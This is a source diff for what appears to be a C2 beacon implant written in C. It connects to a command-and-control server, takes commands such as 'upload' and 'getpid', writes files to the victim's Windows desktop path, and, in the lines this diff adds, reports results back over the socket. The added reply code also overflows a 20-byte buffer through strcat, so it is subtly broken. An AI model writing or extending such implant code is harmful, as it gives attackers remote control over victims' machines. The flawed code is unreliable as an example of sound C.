@@ -193,12 +193,11 @@ int upload(char * filename, char * content){
 	FILE *outfile;
 	outfile = fopen(filename, "wb");
 	if (!outfile) {
-		printf("[upload] [DBG] Error opening file...");
+		printf("[upload] [DBG] Error opening file...\n");
 		return retcode;
 	}
 	else {
-		printf("[upload] [DBG] File %s opened. Trying to write there...", filename);
-		fwrite(content,sizeof(content),1,outfile);
+		fwrite(content,strlen(content),1,outfile);
 		fclose(outfile);
 		return 0;
 	}
@@ -335,14 +334,25 @@ void StartBeacon(char* C2Server, int C2Port)
 			}
 			// Connection verification block END
 			// ------------------
-
+			
 			// Command parsed as whoami (strpcmp makes comparsion with predefined string in this case)
 			if (strcmp(RecvData, "\n") == 0) { memset(RecvData, 0, sizeof(RecvData)); }
 			else if (strcmp(RecvData, "upload\n") == 0) {
 				char * file = "C:\\Users\\IEUser\\Desktop\\test";
-				char * contents = "testing";
+				char * contents = "t3st1ng";
 				printf(" [beacon] [DBG] Uploading %s into %s",contents,file);
 				upload(file,contents);
+				
+				// C&C part
+				char buffer[20];
+				memset(buffer, 0, sizeof(buffer));
+				strcat(buffer,"Uploaded ");
+				strcat(buffer,file);
+
+				send(tcpsock,buffer,strlen(buffer)+1,0);
+				// clear buffers
+				memset(buffer, 0, sizeof(buffer));
+				memset(RecvData, 0, sizeof(RecvData)); 
 			}
 			else if (strcmp(RecvData, "getpid\n") == 0) {
 				DWORD pid;
